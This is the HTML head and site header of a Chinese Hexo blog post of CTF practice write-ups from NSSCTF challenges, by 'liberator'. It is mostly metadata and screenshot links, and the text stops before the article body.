<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="暑假题目[NSSCTF 2022 Spring Recruit]babyphp先看题目源码 123456789101112131415161718192021&lt;?phphighlight_file(__FILE__);include_once(&amp;#x27;flag.php&amp;#x27;);if(isset($_POST[&amp;#x27;a&amp;#x27;])&amp;&amp;!preg_match(">
<meta property="og:type" content="article">
<meta property="og:title" content="NSSCTF刷题">
<meta property="og:url" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/index.html">
<meta property="og:site_name" content="liberator">
<meta property="og:description" content="暑假题目[NSSCTF 2022 Spring Recruit]babyphp先看题目源码 123456789101112131415161718192021&lt;?phphighlight_file(__FILE__);include_once(&amp;#x27;flag.php&amp;#x27;);if(isset($_POST[&amp;#x27;a&amp;#x27;])&amp;&amp;!preg_match(">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNSSCTF%202022%20Spring%20Recruit%5Dbabyphp%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNSSCTF%202022%20Spring%20Recruit%5Dbabyphp%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNSSCTF%202022%20Spring%20Recruit%5Dbabyphp%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGXYCTF%202019%5DBabyUpload%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGXYCTF%202019%5DBabyUpload%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGXYCTF%202019%5DBabyUpload%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGXYCTF%202019%5DBabyUpload%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5DEZ%20WEB%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5DEZ%20WEB%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5DEZ%20WEB%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHCTF%202018%5DWarmup%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5D%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%85%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5D%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%85%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5Dpklovecloud%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5Dpklovecloud%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_rce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_rce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_rce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.jpg">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_rce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_rce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE5.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DMiddle%20magic%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DMiddle%20magic%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5Dyet_another_mysql_injection%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5Dyet_another_mysql_injection%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20Week1%5Deasy_html%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20Week1%5Deasy_html%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20Week1%5Deasy_html%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20Week1%5Deasy_html%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20Week1%5Deasy_html%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHDCTF%202023%5DSearchMaster%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHDCTF%202023%5DSearchMaster%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHDCTF%202023%5DSearchMaster%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasycon%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasycon%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasycon%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5DEasyCleanup%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5DEasyCleanup%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E5%A5%87%E5%A6%99%E7%9A%84MD5%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E5%A5%87%E5%A6%99%E7%9A%84MD5%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Dmiddlerce%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE5.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE6.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE7.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE8.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BLitCTF%202023%5DFlag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BLitCTF%202023%5DFlag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BLitCTF%202023%5DFlag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BLitCTF%202023%5DFlag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Djoin-us%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Djoin-us%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Djoin-us%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Djoin-us%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Djoin-us%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dnumgame%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dnumgame%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dnumgame%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dnumgame%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dhardrce_3%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dhardrce_3%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dhardrce_3%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20WEEK2%5Deasy_include%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20WEEK2%5Deasy_include%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20WEEK2%5Deasy_include%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5D%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5D%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE5.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE6.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE7.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BCISCN%202019%E5%88%9D%E8%B5%9B%5DLove%20Math%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BCISCN%202019%E5%88%9D%E8%B5%9B%5DLove%20Math%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BCISCN%202019%E5%88%9D%E8%B5%9B%5DLove%20Math%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BCISCN%202019%E5%88%9D%E8%B5%9B%5DLove%20Math%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BCISCN%202019%E5%88%9D%E8%B5%9B%5DLove%20Math%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE5.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BBJDCTF%202020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BBJDCTF%202020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E9%B9%8F%E5%9F%8E%E6%9D%AF%202022%5D%E7%AE%80%E5%8D%95%E7%9A%84php%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Dhardsql%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Dhardsql%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE5.png">
<meta property="og:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE6.png">
<meta property="article:published_time" content="2023-08-02T10:34:55.000Z">
<meta property="article:modified_time" content="2023-08-02T10:35:57.857Z">
<meta property="article:author" content="liberator">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNSSCTF%202022%20Spring%20Recruit%5Dbabyphp%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png">


<link rel="canonical" href="http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/","path":"2023/08/02/NSSCTF刷题/","title":"NSSCTF刷题"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>NSSCTF刷题 | liberator</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">liberator</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">天底下没有这样的道理，你不喜欢我，才是正常的</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
